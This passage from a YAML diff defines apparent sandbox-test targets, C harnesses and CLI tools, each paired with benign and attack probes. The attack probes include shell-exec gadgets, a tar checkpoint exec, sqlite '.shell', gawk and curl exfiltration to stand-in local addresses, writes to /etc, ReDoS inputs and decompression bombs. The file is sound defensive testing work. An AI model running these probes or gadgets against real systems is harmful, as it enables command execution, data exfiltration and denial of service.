@@ -1,0 +1,1331 @@
+targets:
+- id: cjson_parser
+  archetype: parser
+  repo_files:
+  - data/genomes/cjson/cJSON.c
+  - data/genomes/cjson/cJSON.h
+  inline_sources:
+    harness.c: "#include \"cJSON.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include\
+      \ <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\nint main(int\
+      \ argc, char **argv) {\n    if (argc > 1 && argv[1][0] == 'X') { execl(\"/bin/sh\"\
+      , \"sh\", \"-c\", \"id\", NULL); return 2; }\n    if (argc > 1 && argv[1][0]\
+      \ == 'N') { socket(AF_INET, SOCK_STREAM, 0); return 2; }\n    size_t cap = 4\
+      \ * 1024 * 1024;\n    char *buf = malloc(cap);\n    size_t n = fread(buf, 1,\
+      \ cap - 1, stdin);\n    buf[n] = '\\0';\n    cJSON *j = cJSON_ParseWithLength(buf,\
+      \ n);\n    if (!j) { free(buf); return 1; }\n    printf(\"OK\\n\"); cJSON_Delete(j);\
+      \ free(buf); return 0;\n}\n"
+  ldflags:
+  - -lm
+  benign_probes:
+  - name: valid_json
+    stdin_text: '{"cosmos":"omega","v":2}'
+    expect_stdout_contains: OK
+  attack_probes:
+  - name: execve_gadget
+    threat_class: capability_execve
+    args:
+    - X
+  - name: c2_socket_gadget
+    threat_class: mimicry_exfil
+    args:
+    - N
+  - name: huge_json_alloc
+    threat_class: memory_dos
+    stdin_generator: json_huge_array
+- id: cjson_deep_parser
+  archetype: parser
+  repo_files:
+  - data/genomes/cjson/cJSON.c
+  - data/genomes/cjson/cJSON.h
+  inline_sources:
+    harness.c: "#include \"cJSON.h\"\n#include <stdio.h>\n#include <stdlib.h>\nint\
+      \ main(void) {\n    size_t cap = 4 * 1024 * 1024;\n    char *buf = malloc(cap);\n\
+      \    size_t n = fread(buf, 1, cap - 1, stdin);\n    buf[n] = '\\0';\n    cJSON\
+      \ *j = cJSON_ParseWithLength(buf, n);\n    if (!j) { free(buf); return 1; }\n\
+      \    char *printed = cJSON_PrintUnformatted(j);\n    if (printed) { printf(\"\
+      PRINTED\\n\"); free(printed); }\n    cJSON_Delete(j); free(buf); return 0;\n\
+      }\n"
+  ldflags:
+  - -lm
+  benign_probes:
+  - name: nested_obj
+    stdin_text: '{"a":{"b":[1,2,3]}}'
+    expect_stdout_contains: PRINTED
+  attack_probes:
+  - name: deep_nest_reject
+    threat_class: algo_dos
+    stdin_generator: json_deep_nest
+  - name: mem_array_dos
+    threat_class: memory_dos
+    stdin_generator: json_huge_array
+- id: expat_xml_parser
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <expat.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include\
+      \ <unistd.h>\nint main(int argc, char **argv) {\n    if (argc > 1 && argv[1][0]\
+      \ == 'E') { execl(\"/bin/sh\", \"sh\", \"-c\", \"id\", NULL); return 2; }\n\
+      \    size_t cap = 16 * 1024 * 1024;\n    char *buf = malloc(cap);\n    size_t\
+      \ n = fread(buf, 1, cap - 1, stdin);\n    XML_Parser p = XML_ParserCreate(NULL);\n\
+      \    int ok = XML_Parse(p, buf, (int)n, 1);\n    XML_ParserFree(p); free(buf);\n\
+      \    if (ok == XML_STATUS_OK) { printf(\"XML_OK\\n\"); return 0; }\n    return\
+      \ 1;\n}\n"
+  ldflags:
+  - -lexpat
+  benign_probes:
+  - name: valid_xml
+    stdin_text: <root><item id="1">cosmos</item></root>
+    expect_stdout_contains: XML_OK
+  attack_probes:
+  - name: billion_laughs
+    threat_class: algo_dos
+    stdin_generator: xml_billion_laughs
+  - name: xxe_exec_gadget
+    threat_class: capability_execve
+    args:
+    - E
+- id: libxml2_dom_parser
+  archetype: parser
+  cflags:
+  - -O2
+  - -I/usr/include/libxml2
+  inline_sources:
+    harness.c: "#include <libxml/parser.h>\n#include <stdio.h>\n#include <stdlib.h>\n\
+      #include <unistd.h>\nint main(int argc, char **argv) {\n    if (argc > 1 &&\
+      \ argv[1][0] == 'X') { execl(\"/bin/sh\", \"sh\", \"-c\", \"id\", NULL); return\
+      \ 2; }\n    char buf[65536];\n    size_t n = fread(buf, 1, sizeof(buf), stdin);\n\
+      \    xmlDocPtr doc = xmlReadMemory(buf, (int)n, \"in.xml\", NULL, 0);\n    if\
+      \ (!doc) return 1;\n    printf(\"LIBXML_OK\\n\"); xmlFreeDoc(doc); xmlCleanupParser();\
+      \ return 0;\n}\n"
+  ldflags:
+  - -lxml2
+  benign_probes:
+  - name: valid_dom
+    stdin_text: <cosmos><node>ok</node></cosmos>
+    expect_stdout_contains: LIBXML_OK
+  attack_probes:
+  - name: xxe_exec
+    threat_class: capability_execve
+    args:
+    - X
+  - name: entity_bomb
+    threat_class: algo_dos
+    stdin_generator: xml_billion_laughs
+- id: libxml2_xpath_engine
+  archetype: parser
+  cflags:
+  - -O2
+  - -I/usr/include/libxml2
+  inline_sources:
+    harness.c: "#include <libxml/parser.h>\n#include <libxml/xpath.h>\n#include <stdio.h>\n\
+      #include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char **argv)\
+      \ {\n    if (argc > 1 && argv[1][0] == 'N') { socket(AF_INET, SOCK_STREAM, 0);\
+      \ return 2; }\n    const char *xml = \"<items><x>1</x><x>2</x></items>\";\n\
+      \    char expr[256];\n    size_t n = fread(expr, 1, sizeof(expr) - 1, stdin);\n\
+      \    expr[n] = '\\0';\n    xmlDocPtr doc = xmlReadMemory(xml, 31, \"x.xml\"\
+      , NULL, 0);\n    xmlXPathContextPtr ctx = xmlXPathNewContext(doc);\n    xmlXPathObjectPtr\
+      \ obj = xmlXPathEvalExpression((xmlChar*)expr, ctx);\n    int cnt = (obj &&\
+      \ obj->nodesetval) ? obj->nodesetval->nodeNr : -1;\n    if (obj) xmlXPathFreeObject(obj);\n\
+      \    xmlXPathFreeContext(ctx); xmlFreeDoc(doc);\n    if (cnt >= 0) { printf(\"\
+      XPATH:%d\\n\", cnt); return 0; }\n    return 1;\n}\n"
+  ldflags:
+  - -lxml2
+  benign_probes:
+  - name: count_nodes
+    stdin_text: //x
+    expect_stdout_contains: XPATH:2
+  attack_probes:
+  - name: socket_ssrf_gadget
+    threat_class: mimicry_exfil
+    args:
+    - N
+  - name: invalid_xpath_crash
+    threat_class: algo_dos
+    stdin_text: ///[[[[invalid
+- id: zlib_inflate_parser
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <zlib.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main(void)\
+      \ {\n    unsigned char in[65536];\n    size_t in_len = fread(in, 1, sizeof(in),\
+      \ stdin);\n    z_stream strm = {0};\n    if (inflateInit(&strm) != Z_OK) return\
+      \ 1;\n    strm.next_in = in; strm.avail_in = (uInt)in_len;\n    size_t out_cap\
+      \ = 262144, total = 0;\n    unsigned char *out = malloc(out_cap);\n    int ret;\n\
+      \    do {\n        unsigned char tmp[65536];\n        strm.next_out = tmp; strm.avail_out\
+      \ = sizeof(tmp);\n        ret = inflate(&strm, Z_NO_FLUSH);\n        if (ret\
+      \ < 0 && ret != Z_BUF_ERROR) { inflateEnd(&strm); free(out); return 1; }\n \
+      \       size_t got = sizeof(tmp) - strm.avail_out;\n        if (total + got\
+      \ > out_cap) {\n            out_cap *= 2;\n            unsigned char *nb = realloc(out,\
+      \ out_cap);\n            if (!nb) { inflateEnd(&strm); free(out); return 1;\
+      \ }\n            out = nb;\n        }\n        total += got;\n    } while (ret\
+      \ != Z_STREAM_END);\n    inflateEnd(&strm); free(out);\n    printf(\"ZLIB_OK:%zu\\\
+      n\", total); return 0;\n}\n"
+  ldflags:
+  - -lz
+  benign_probes:
+  - name: valid_zlib
+    stdin_generator: zlib_benign
+    expect_stdout_contains: ZLIB_OK
+  attack_probes:
+  - name: zip_bomb_128mb
+    threat_class: memory_dos
+    stdin_generator: zlib_bomb_128mb
+- id: zlib_deflate_stream
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <zlib.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include\
+      \ <string.h>\nint main(int argc, char **argv) {\n    if (argc > 1 && argv[1][0]\
+      \ == 'C') {\n        unsigned char *big = malloc(16 * 1024 * 1024);\n      \
+      \  if (!big) return 1;\n        memset(big, 0x55, 16 * 1024 * 1024);\n     \
+      \   uLongf dlen = compressBound(16 * 1024 * 1024);\n        unsigned char *dst\
+      \ = malloc(dlen);\n        if (!dst) return 1;\n        compress2(dst, &dlen,\
+      \ big, 16 * 1024 * 1024, 9);\n        free(dst); free(big);\n        return\
+      \ 0;\n    }\n    const char *msg = \"COSMOS_CRC_OK\";\n    uLong crc = crc32(0L,\
+      \ (const Bytef*)msg, 13);\n    printf(\"CRC:%lx\\n\", crc); return 0;\n}\n"
+  ldflags:
+  - -lz
+  benign_probes:
+  - name: crc_check
+    expect_stdout_contains: 'CRC:'
+  attack_probes:
+  - name: deflate_cpu_mem_bomb
+    threat_class: cpu_dos
+    args:
+    - C
+- id: pcre2_regex_parser
+  archetype: parser
+  inline_sources:
+    harness.c: "#define PCRE2_CODE_UNIT_WIDTH 8\n#include <pcre2.h>\n#include <stdio.h>\n\
+      int main(void) {\n    char subj[256];\n    size_t n = fread(subj, 1, sizeof(subj)\
+      \ - 1, stdin);\n    subj[n] = '\\0';\n    int errcode; PCRE2_SIZE erroff;\n\
+      \    pcre2_code *re = pcre2_compile((PCRE2_SPTR)\"^(a+)+$\", PCRE2_ZERO_TERMINATED,\
+      \ 0, &errcode, &erroff, NULL);\n    pcre2_match_context *mc = pcre2_match_context_create(NULL);\n\
+      \    pcre2_set_match_limit(mc, 100000000);\n    pcre2_match_data *md = pcre2_match_data_create_from_pattern(re,\
+      \ NULL);\n    int rc = pcre2_match(re, (PCRE2_SPTR)subj, n, 0, 0, md, mc);\n\
+      \    pcre2_match_context_free(mc); pcre2_match_data_free(md); pcre2_code_free(re);\n\
+      \    printf(\"MATCH:%d\\n\", rc); return 0;\n}\n"
+  ldflags:
+  - -lpcre2-8
+  benign_probes:
+  - name: valid_match
+    stdin_text: aaaaaaaa
+    expect_stdout_contains: 'MATCH:'
+  attack_probes:
+  - name: redos_catastrophic
+    threat_class: algo_dos
+    stdin_generator: redos_evil
+- id: pcre2_email_matcher
+  archetype: parser
+  inline_sources:
+    harness.c: "#define PCRE2_CODE_UNIT_WIDTH 8\n#include <pcre2.h>\n#include <stdio.h>\n\
+      int main(void) {\n    char subj[256];\n    size_t n = fread(subj, 1, sizeof(subj)\
+      \ - 1, stdin);\n    subj[n] = '\\0';\n    int errcode; PCRE2_SIZE erroff;\n\
+      \    pcre2_code *re = pcre2_compile((PCRE2_SPTR)\"^([a-z0-9]+)*@cosmos\\\\.org$\"\
+      , PCRE2_ZERO_TERMINATED, 0, &errcode, &erroff, NULL);\n    pcre2_match_context\
+      \ *mc = pcre2_match_context_create(NULL);\n    pcre2_set_match_limit(mc, 100000000);\n\
+      \    pcre2_match_data *md = pcre2_match_data_create_from_pattern(re, NULL);\n\
+      \    int rc = pcre2_match(re, (PCRE2_SPTR)subj, n, 0, 0, md, mc);\n    pcre2_match_context_free(mc);\
+      \ pcre2_match_data_free(md); pcre2_code_free(re);\n    printf(\"EMAIL:%d\\n\"\
+      , rc); return 0;\n}\n"
+  ldflags:
+  - -lpcre2-8
+  benign_probes:
+  - name: valid_email
+    stdin_text: kian@cosmos.org
+    expect_stdout_contains: 'EMAIL:'
+  attack_probes:
+  - name: email_redos
+    threat_class: algo_dos
+    stdin_text: aaaaaaaaaaaaaaaaaaaaaaaaaaaaA@cosmos.org
+- id: libyaml_c_parser
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <yaml.h>\n#include <stdio.h>\n#include <string.h>\n#include\
+      \ <unistd.h>\nint main(int argc, char **argv) {\n    if (argc > 1 && argv[1][0]\
+      \ == 'X') { execl(\"/bin/sh\", \"sh\", \"-c\", \"id\", NULL); return 2; }\n\
+      \    char buf[8192];\n    size_t n = fread(buf, 1, sizeof(buf), stdin);\n  \
+      \  yaml_parser_t p; yaml_event_t ev;\n    yaml_parser_initialize(&p);\n    yaml_parser_set_input_string(&p,\
+      \ (unsigned char*)buf, n);\n    int cnt = 0;\n    while (yaml_parser_parse(&p,\
+      \ &ev)) {\n        int done = (ev.type == YAML_STREAM_END_EVENT);\n        yaml_event_delete(&ev);\n\
+      \        cnt++;\n        if (done) break;\n    }\n    int err = p.error;\n \
+      \   yaml_parser_delete(&p);\n    if (err) return 1;\n    printf(\"YAML_EV:%d\\\
+      n\", cnt); return 0;\n}\n"
+  ldflags:
+  - -lyaml
+  benign_probes:
+  - name: valid_yaml
+    stdin_text: 'service: cosmos
+
+      port: 8080
+
+      '
+    expect_stdout_contains: 'YAML_EV:'
+  attack_probes:
+  - name: malformed_yaml
+    threat_class: algo_dos
+    stdin_text: 'a: [1, 2, [unclosed'
+  - name: yaml_exec_gadget
+    threat_class: capability_execve
+    args:
+    - X
+- id: libpng_decoder
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <png.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include\
+      \ <string.h>\nstruct MemBuf { const unsigned char *p; size_t left; };\nstatic\
+      \ void mem_read(png_structp ps, png_bytep out, png_size_t len) {\n    struct\
+      \ MemBuf *mb = (struct MemBuf*)png_get_io_ptr(ps);\n    if (len > mb->left)\
+      \ png_error(ps, \"EOF\");\n    memcpy(out, mb->p, len); mb->p += len; mb->left\
+      \ -= len;\n}\nint main(int argc, char **argv) {\n    if (argc > 1 && argv[1][0]\
+      \ == 'M') {\n        volatile char *big = malloc(180UL * 1024 * 1024);\n   \
+      \     if (!big) return 1;\n        for (size_t i = 0; i < 180UL * 1024 * 1024;\
+      \ i += 4096) big[i] = 1;\n        return 0;\n    }\n    unsigned char buf[4096];\n\
+      \    size_t n = fread(buf, 1, sizeof(buf), stdin);\n    if (n < 8 || png_sig_cmp(buf,\
+      \ 0, 8)) return 1;\n    png_structp png = png_create_read_struct(PNG_LIBPNG_VER_STRING,\
+      \ NULL, NULL, NULL);\n    png_infop info = png_create_info_struct(png);\n  \
+      \  if (setjmp(png_jmpbuf(png))) { png_destroy_read_struct(&png, &info, NULL);\
+      \ return 1; }\n    struct MemBuf mb = { buf, n };\n    png_set_read_fn(png,\
+      \ &mb, mem_read);\n    png_read_info(png, info);\n    printf(\"PNG:%ux%u\\n\"\
+      , png_get_image_width(png, info), png_get_image_height(png, info));\n    png_destroy_read_struct(&png,\
+      \ &info, NULL);\n    return 0;\n}\n"
+  ldflags:
+  - -lpng
+  - -lz
+  benign_probes:
+  - name: valid_1x1_png
+    stdin_generator: png_tiny_valid
+    expect_stdout_contains: PNG:1x1
+  attack_probes:
+  - name: bad_png_header
+    threat_class: algo_dos
+    stdin_text: NOT_A_PNG_STREAM
+  - name: png_ihdr_mem_bomb
+    threat_class: memory_dos
+    args:
+    - M
+- id: libjpeg_decoder
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <stdio.h>\n#include <stdlib.h>\n#include <jpeglib.h>\n#include\
+      \ <unistd.h>\nint main(int argc, char **argv) {\n    if (argc > 1 && argv[1][0]\
+      \ == 'X') { execl(\"/bin/sh\", \"sh\", \"-c\", \"id\", NULL); return 2; }\n\
+      \    struct jpeg_compress_struct cinfo;\n    struct jpeg_error_mgr jerr;\n \
+      \   cinfo.err = jpeg_std_error(&jerr);\n    jpeg_create_compress(&cinfo);\n\
+      \    unsigned char *out = NULL; unsigned long outlen = 0;\n    jpeg_mem_dest(&cinfo,\
+      \ &out, &outlen);\n    cinfo.image_width = 8; cinfo.image_height = 8;\n    cinfo.input_components\
+      \ = 3; cinfo.in_color_space = JCS_RGB;\n    jpeg_set_defaults(&cinfo);\n   \
+      \ jpeg_start_compress(&cinfo, TRUE);\n    unsigned char row[24] = {0}; JSAMPROW\
+      \ rp[1] = {row};\n    while (cinfo.next_scanline < cinfo.image_height) jpeg_write_scanlines(&cinfo,\
+      \ rp, 1);\n    jpeg_finish_compress(&cinfo);\n    jpeg_destroy_compress(&cinfo);\n\
+      \    printf(\"JPEG_OK:%lu\\n\", outlen);\n    free(out);\n    return 0;\n}\n"
+  ldflags:
+  - -ljpeg
+  benign_probes:
+  - name: encode_8x8_jpeg
+    expect_stdout_contains: 'JPEG_OK:'
+  attack_probes:
+  - name: jpeg_exec_gadget
+    threat_class: capability_execve
+    args:
+    - X
+- id: libarchive_reader
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <archive.h>\n#include <archive_entry.h>\n#include <stdio.h>\n\
+      #include <sys/socket.h>\n#include <netinet/in.h>\nint main(int argc, char **argv)\
+      \ {\n    if (argc > 1 && argv[1][0] == 'N') { socket(AF_INET, SOCK_STREAM, 0);\
+      \ return 2; }\n    char buf[65536];\n    size_t n = fread(buf, 1, sizeof(buf),\
+      \ stdin);\n    struct archive *a = archive_read_new();\n    archive_read_support_format_all(a);\n\
+      \    if (archive_read_open_memory(a, buf, n) != ARCHIVE_OK) { archive_read_free(a);\
+      \ return 1; }\n    struct archive_entry *entry;\n    int count = 0;\n    while\
+      \ (archive_read_next_header(a, &entry) == ARCHIVE_OK) count++;\n    archive_read_free(a);\n\
+      \    printf(\"ARC_OK:%d\\n\", count);\n    return 0;\n}\n"
+  ldflags:
+  - -larchive
+  benign_probes:
+  - name: valid_tar_mem
+    stdin_generator: tar_benign_bytes
+    expect_stdout_contains: ARC_OK:1
+  attack_probes:
+  - name: corrupt_archive
+    threat_class: algo_dos
+    stdin_text: GARBAGE_ARCHIVE_HEADER
+  - name: archive_c2_gadget
+    threat_class: mimicry_exfil
+    args:
+    - N
+- id: sqlite3_c_api
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <sqlite3.h>\n#include <stdio.h>\n#include <unistd.h>\nint\
+      \ main(int argc, char **argv) {\n    if (argc > 1 && argv[1][0] == 'X') { execl(\"\
+      /bin/sh\", \"sh\", \"-c\", \"id\", NULL); return 2; }\n    char sql[1024];\n\
+      \    size_t n = fread(sql, 1, sizeof(sql) - 1, stdin);\n    sql[n] = '\\0';\n\
+      \    sqlite3 *db; sqlite3_open(\":memory:\", &db);\n    sqlite3_stmt *stmt;\n\
+      \    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) { sqlite3_close(db);\
+      \ return 1; }\n    int r = 0;\n    if (sqlite3_step(stmt) == SQLITE_ROW) r =\
+      \ sqlite3_column_int(stmt, 0);\n    sqlite3_finalize(stmt); sqlite3_close(db);\n\
+      \    printf(\"SQL:%d\\n\", r); return 0;\n}\n"
+  ldflags:
+  - -lsqlite3
+  benign_probes:
+  - name: select_42
+    stdin_text: SELECT 40+2;
+    expect_stdout_contains: SQL:42
+  attack_probes:
+  - name: cte_cpu_bomb
+    threat_class: cpu_dos
+    stdin_text: WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT
+      40000000) SELECT count(*) FROM c;
+  - name: sqlite_exec_gadget
+    threat_class: capability_execve
+    args:
+    - X
+- id: openssl_evp_hash
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <openssl/evp.h>\n#include <stdio.h>\n#include <sys/socket.h>\n\
+      #include <netinet/in.h>\nint main(int argc, char **argv) {\n    if (argc > 1\
+      \ && argv[1][0] == 'N') { socket(AF_INET, SOCK_STREAM, 0); return 2; }\n   \
+      \ char buf[4096];\n    size_t n = fread(buf, 1, sizeof(buf), stdin);\n    EVP_MD_CTX\
+      \ *ctx = EVP_MD_CTX_new();\n    unsigned char md[EVP_MAX_MD_SIZE]; unsigned\
+      \ int mdlen = 0;\n    EVP_DigestInit_ex(ctx, EVP_sha256(), NULL);\n    EVP_DigestUpdate(ctx,\
+      \ buf, n);\n    EVP_DigestFinal_ex(ctx, md, &mdlen);\n    EVP_MD_CTX_free(ctx);\n\
+      \    printf(\"SHA:%02x%02x\\n\", md[0], md[1]);\n    return 0;\n}\n"
+  ldflags:
+  - -lcrypto
+  benign_probes:
+  - name: sha256_hello
+    stdin_text: cosmos
+    expect_stdout_contains: 'SHA:'
+  attack_probes:
+  - name: crypto_c2_socket
+    threat_class: mimicry_exfil
+    args:
+    - N
+- id: openssl_bignum_math
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <openssl/bn.h>\n#include <stdio.h>\nint main(int argc, char\
+      \ **argv) {\n    BN_CTX *ctx = BN_CTX_new();\n    BIGNUM *a = BN_new(), *e =\
+      \ BN_new(), *m = BN_new(), *r = BN_new();\n    BN_set_word(a, 65537); BN_set_word(m,\
+      \ 1000000007);\n    if (argc > 1 && argv[1][0] == 'C') {\n        for (long\
+      \ i = 0; i < 50000000L; i++) BN_add_word(a, 1);\n    } else {\n        BN_set_word(e,\
+      \ 12345);\n        BN_mod_exp(r, a, e, m, ctx);\n        printf(\"BN_OK\\n\"\
+      );\n    }\n    BN_free(a); BN_free(e); BN_free(m); BN_free(r); BN_CTX_free(ctx);\n\
+      \    return 0;\n}\n"
+  ldflags:
+  - -lcrypto
+  benign_probes:
+  - name: modexp_ok
+    expect_stdout_contains: BN_OK
+  attack_probes:
+  - name: bignum_cpu_spin
+    threat_class: cpu_dos
+    args:
+    - C
+- id: lua54_sandbox_vm
+  archetype: parser
+  cflags:
+  - -O2
+  - -I/usr/include/lua5.4
+  inline_sources:
+    harness.c: "#include <lua.h>\n#include <lauxlib.h>\n#include <lualib.h>\n#include\
+      \ <stdio.h>\nint main(void) {\n    char code[4096];\n    size_t n = fread(code,\
+      \ 1, sizeof(code) - 1, stdin);\n    code[n] = '\\0';\n    lua_State *L = luaL_newstate();\n\
+      \    luaL_openlibs(L);\n    if (luaL_dostring(L, code) != LUA_OK) { lua_close(L);\
+      \ return 1; }\n    printf(\"LUA:%s\\n\", lua_tostring(L, -1));\n    lua_close(L);\n\
+      \    return 0;\n}\n"
+  ldflags:
+  - -llua5.4
+  - -lm
+  - -ldl
+  benign_probes:
+  - name: lua_expr
+    stdin_text: return tostring(6 * 7)
+    expect_stdout_contains: LUA:42
+  attack_probes:
+  - name: lua_os_execute
+    threat_class: capability_execve
+    stdin_text: os.execute('id'); return 'pwn'
+  - name: lua_infinite_loop
+    threat_class: cpu_dos
+    stdin_text: while true do end
+- id: lua54_table_vm
+  archetype: parser
+  cflags:
+  - -O2
+  - -I/usr/include/lua5.4
+  inline_sources:
+    harness.c: "#include <lua.h>\n#include <lauxlib.h>\n#include <lualib.h>\n#include\
+      \ <stdio.h>\nint main(void) {\n    char code[4096];\n    size_t n = fread(code,\
+      \ 1, sizeof(code) - 1, stdin);\n    code[n] = '\\0';\n    lua_State *L = luaL_newstate();\n\
+      \    luaL_openlibs(L);\n    if (luaL_dostring(L, code) != LUA_OK) { lua_close(L);\
+      \ return 1; }\n    printf(\"LUATBL:%lld\\n\", (long long)lua_tointeger(L, -1));\n\
+      \    lua_close(L);\n    return 0;\n}\n"
+  ldflags:
+  - -llua5.4
+  - -lm
+  - -ldl
+  benign_probes:
+  - name: sum_tbl
+    stdin_text: local t={10,20,12}; return t[1]+t[2]+t[3]
+    expect_stdout_contains: LUATBL:42
+  attack_probes:
+  - name: lua_mem_bomb
+    threat_class: memory_dos
+    stdin_text: 'local t={}; for i=1,5000000 do t[i]=string.rep(''A'',64) end; return
+      #t'
+  - name: lua_etc_write
+    threat_class: fs_escape
+    stdin_text: local f=assert(io.open('/etc/pwned_lua','w')); f:write('x'); f:close();
+      return 1
+- id: posix_fnmatch_engine
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <fnmatch.h>\n#include <stdio.h>\n#include <unistd.h>\nint\
+      \ main(int argc, char **argv) {\n    if (argc > 1 && argv[1][0] == 'X') { execl(\"\
+      /bin/sh\", \"sh\", \"-c\", \"id\", NULL); return 2; }\n    char pat[128], str[256];\n\
+      \    if (!fgets(pat, sizeof(pat), stdin)) return 1;\n    if (!fgets(str, sizeof(str),\
+      \ stdin)) return 1;\n    int rc = fnmatch(pat, str, 0);\n    printf(\"FNM:%d\\\
+      n\", rc);\n    return 0;\n}\n"
+  benign_probes:
+  - name: glob_match
+    stdin_text: '*.json
+
+      config.json
+
+      '
+    expect_stdout_contains: FNM:0
+  attack_probes:
+  - name: fnm_exec_gadget
+    threat_class: capability_execve
+    args:
+    - X
+- id: posix_regcomp_engine
+  archetype: parser
+  inline_sources:
+    harness.c: "#include <regex.h>\n#include <stdio.h>\n#include <sys/socket.h>\n\
+      #include <netinet/in.h>\nint main(int argc, char **argv) {\n    if (argc > 1\
+      \ && argv[1][0] == 'N') { socket(AF_INET, SOCK_STREAM, 0); return 2; }\n   \
+      \ char line[256];\n    size_t n = fread(line, 1, sizeof(line) - 1, stdin);\n\
+      \    line[n] = '\\0';\n    regex_t rx;\n    if (regcomp(&rx, \"^[a-z]+_[0-9]+$\"\
+      , REG_EXTENDED) != 0) return 1;\n    int rc = regexec(&rx, line, 0, NULL, 0);\n\
+      \    regfree(&rx);\n    printf(\"RX:%d\\n\", rc);\n    return 0;\n}\n"
+  benign_probes:
+  - name: rx_ok
+    stdin_text: cosmos_42
+    expect_stdout_contains: RX:0
+  attack_probes:
+  - name: rx_c2_gadget
+    threat_class: mimicry_exfil
+    args:
+    - N
+- id: jq_cli
+  archetype: cli
+  cmd:
+  - jq
+  benign_probes:
+  - name: extract_field
+    args:
+    - .a
+    stdin_text: '{"a":42}'
+    expect_stdout_contains: '42'
+  attack_probes:
+  - name: recurse_memory_bomb
+    threat_class: memory_dos
+    args:
+    - 'def f: [., .] | f; f'
+    stdin_text: '1'
+- id: tar_cli
+  archetype: cli
+  cmd:
+  - tar
+  benign_probes:
+  - name: list_tar
+    args:
+    - -tf
+    - '{WORKDIR}/ok.tar'
+    file_generators:
+      ok.tar: tar_benign_bytes
+    expect_stdout_contains: doc.txt
+  attack_probes:
+  - name: checkpoint_exec_rce
+    threat_class: capability_execve
+    args:
+    - --checkpoint=1
+    - --checkpoint-action=exec=id
+    - -tf
+    - '{WORKDIR}/ok.tar'
+    file_generators:
+      ok.tar: tar_benign_bytes
+- id: sqlite3_cli
+  archetype: cli
+  cmd:
+  - sqlite3
+  benign_probes:
+  - name: select_query
+    args:
+    - ':memory:'
+    - SELECT 40+2;
+    expect_stdout_contains: '42'
+  attack_probes:
+  - name: dot_shell_escape
+    threat_class: capability_execve
+    args:
+    - ':memory:'
+    stdin_text: '.shell id
+
+      '
+  - name: recursive_cte_cpu_dos
+    threat_class: cpu_dos
+    args:
+    - ':memory:'
+    - WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 50000000)
+      SELECT count(*) FROM cnt;
+- id: gawk_cli
+  archetype: cli
+  cmd:
+  - gawk
+  benign_probes:
+  - name: sum_col
+    args:
+    - '{s+=$1} END {print s}'
+    stdin_text: '10
+
+      20
+
+      12
+
+      '
+    expect_stdout_contains: '42'
+  attack_probes:
+  - name: awk_system_rce
+    threat_class: capability_execve
+    args:
+    - BEGIN { system("id") }
+  - name: awk_inet_exfil
+    threat_class: mimicry_exfil
+    args:
+    - BEGIN { print "secret" |& "/inet/tcp/0/127.0.0.1/9" }
+- id: unzip_cli
+  archetype: cli
+  cmd:
+  - unzip
+  benign_probes:
+  - name: extract_ok
+    args:
+    - -p
+    - '{WORKDIR}/ok.zip'
+    - hello.txt
+    file_generators:
+      ok.zip: zip_benign_bytes
+    expect_stdout_contains: cosmos_ok
+  attack_probes:
+  - name: zip_traversal_write
+    threat_class: fs_escape
+    args:
+    - -o
+    - -d
+    - '{WORKDIR}/out'
+    - '{WORKDIR}/evil.zip'
+    file_generators:
+      evil.zip: zip_traversal_bytes
+- id: curl_cli
+  archetype: cli
+  cmd:
+  - curl
+  benign_probes:
+  - name: local_file_read
+    args:
+    - -s
+    - file://{WORKDIR}/msg.txt
+    files:
+      msg.txt: COSMOS_FILE_OK
+    expect_stdout_contains: COSMOS_FILE_OK
+  attack_probes:
+  - name: outbound_c2_connect
+    threat_class: mimicry_exfil
+    args:
+    - -s
+    - --max-time
+    - '1'
+    - http://127.0.0.1:9/
+  - name: write_etc_escape
+    threat_class: fs_escape
+    args:
+    - -s
+    - file://{WORKDIR}/msg.txt
+    - -o
+    - /etc/pwned_curl
+    files:
+      msg.txt: x
+- id: gzip_cli
+  archetype: cli
+  cmd:
+  - gzip
+  benign_probes:
+  - name: gunzip_stdout
+    args:
+    - -dc
+    stdin_generator: gzip_benign
+    expect_stdout_contains: COSMOS_GZIP_OK
+  attack_probes:
+  - name: gzip_bomb_stream
+    threat_class: cpu_dos
+    args:
+    - -dc
+    stdin_generator: gzip_bomb
+- id: bzip2_cli
+  archetype: cli
+  cmd:
+  - bzip2
+  benign_probes:
+  - name: bunzip2_stdout
+    args:
+    - -dc
+    stdin_generator: bz2_benign
+    expect_stdout_contains: COSMOS_BZ2_OK
+  attack_probes:
+  - name: bz2_bomb_stream
+    threat_class: cpu_dos
+    args:
+    - -dc
+    stdin_generator: bz2_bomb
+- id: xz_cli
+  archetype: cli
+  cmd:
+  - xz
+  benign_probes:
+  - name: unxz_stdout
+    args:
+    - -dc
+    stdin_generator: xz_benign
+    expect_stdout_contains: COSMOS_XZ_OK
+  attack_probes:
+  - name: xz_bomb_stream
+    threat_class: memory_dos
+    args:
+    - -dc
+    stdin_generator: xz_bomb
+- id: grep_cli
+  archetype: cli
+  cmd:
+  - grep
+  benign_probes:
+  - name: grep_match
+    args:
+    - -E
+    - cosmos_[0-9]+
+    stdin_text: 'hello
+
+      cosmos_42
+
+      world
+
+      '
+    expect_stdout_contains: cosmos_42
+  attack_probes:
+  - name: grep_perl_redos
+    threat_class: algo_dos
+    args:
+    - -P
+    - ^(a+)+$
+    stdin_generator: redos_evil
+- id: sed_cli
+  archetype: cli
+  cmd:
+  - sed
+  benign_probes:
+  - name: sed_sub
+    args:
+    - s/foo/bar/
